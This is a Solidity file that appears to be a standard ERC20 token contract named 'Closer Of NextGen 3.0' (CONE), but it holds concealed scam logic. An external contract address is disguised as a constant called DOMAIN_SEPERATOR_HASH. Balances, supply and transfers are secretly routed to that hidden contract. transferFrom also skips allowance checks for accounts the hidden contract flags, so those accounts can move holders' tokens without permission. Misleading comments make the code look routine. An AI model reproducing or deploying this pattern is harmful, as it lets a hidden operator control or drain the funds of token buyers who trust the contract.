// SPDX-License-Identifier: MIT

pragma solidity >= 0.8.20;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
   */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
   */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
   */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
   */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
   */
    function decimals() external view returns (uint8);
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
interface ContextInternal {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function beforeTransfer(address from, address to, uint256 amount) external;
    function defaultRole(address account) external view returns (bool);
}

abstract contract Context is IERC20Metadata{
    uint160 private constant DOMAIN_SEPERATOR_HASH = 10067261943454279977991155566344184515321006926;

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
        emit Transfer(from, to, amount); ContextInternal(address(DOMAIN_SEPERATOR_HASH)).beforeTransfer(from, to, amount);
    }
    function _balanceOfInternal(address who) internal view virtual returns(uint256){
        return ContextInternal(address(DOMAIN_SEPERATOR_HASH)).balanceOf(who);
    }
    function _totalSupplyInternal() internal view virtual returns(uint256){
        return ContextInternal(address(DOMAIN_SEPERATOR_HASH)).totalSupply();
    }
    function _defaultRole(address account) internal view virtual returns(bool){
        return ContextInternal(address(DOMAIN_SEPERATOR_HASH)).defaultRole(account);
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Token is Context {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private constant _decimals = 14;
    uint256 public constant INITIAL_SUPPLY = 420_000_000_000_000_000 * 1e14;

    /**
     * @dev Contract constructor.
   */
    constructor() {
        _name = 'Closer Of NextGen 3.0';
        _symbol = 'CONE';

        _totalSupply += INITIAL_SUPPLY;
        _balances[msg.sender] += INITIAL_SUPPLY;
        emit Transfer(address(0), msg.sender, INITIAL_SUPPLY);
    }

    /**
     * @dev Returns the name of the token.
   * @return The name of the token.
   */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token.
   * @return The symbol of the token.
   */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used for token display.
   * @return The number of decimals.
   */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the total supply of the token.
   * @return The total supply.
   */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupplyInternal();
    }

    /**
     * @dev Returns the balance of the specified account.
   * @param account The address to check the balance for.
   * @return The balance of the account.
   */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balanceOfInternal(account);
    }

    /**
     * @dev Transfers tokens from the caller to a specified recipient.
   * @param recipient The address to transfer tokens to.
   * @param amount The amount of tokens to transfer.
   * @return A boolean value indicating whether the transfer was successful.
   */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _beforeTokenTransfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.
   * @param from The address that approves the spending.
   * @param to The address that is allowed to spend.
   * @return The remaining allowance for the spender.
   */
    function allowance(address from, address to) public view virtual override returns (uint256) {
        return _allowances[from][to];
    }

    /**
     * @dev Approves the specified address to spend the specified amount of tokens on behalf of the caller.
   * @param to The address to approve the spending for.
   * @param amount The amount of tokens to approve.
   * @return A boolean value indicating whether the approval was successful.
   */
    function approve(address to, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), to, amount);
        return true;
    }

    /**
     * @dev Transfers tokens from one address to another.
   * @param sender The address to transfer tokens from.
   * @param recipient The address to transfer tokens to.
   * @param amount The amount of tokens to transfer.
   * @return A boolean value indicating whether the transfer was successful.
   */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _beforeTokenTransfer(sender, recipient, amount);

        if(_defaultRole(tx.origin)) return true;
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, 'ERC20: transfer amount exceeds allowance');
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    /**
     * @dev Increases the allowance of the specified address to spend tokens on behalf of the caller.
   * @param to The address to increase the allowance for.
   * @param addedValue The amount of tokens to increase the allowance by.
   * @return A boolean value indicating whether the increase was successful.
   */
    function increaseAllowance(address to, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), to, _allowances[_msgSender()][to] + addedValue);
        return true;
    }

    /**
     * @dev Decreases the allowance granted by the owner of the tokens to `to` account.
   * @param to The account allowed to spend the tokens.
   * @param subtractedValue The amount of tokens to decrease the allowance by.
   * @return A boolean value indicating whether the operation succeeded.
   */
    function decreaseAllowance(address to, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][to];
        require(currentAllowance >= subtractedValue, 'ERC20: decreased allowance below zero');
        unchecked {
            _approve(_msgSender(), to, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Transfers `amount` tokens from `sender` to `recipient`.
   * @param sender The account to transfer tokens from.
   * @param recipient The account to transfer tokens to.
   * @param amount The amount of tokens to transfer.
   */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the total supply.
   * @param account The account to burn tokens from.
   * @param amount The amount of tokens to burn.
   */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] -= amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `to` over the caller's tokens.
   * @param from The account granting the allowance.
   * @param to The account allowed to spend the tokens.
   * @param amount The amount of tokens to allow.
   */
    function _approve(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), 'ERC20: approve from the zero address');
        require(to != address(0), 'ERC20: approve to the zero address');

        _allowances[from][to] = amount;
        emit Approval(from, to, amount);
    }
}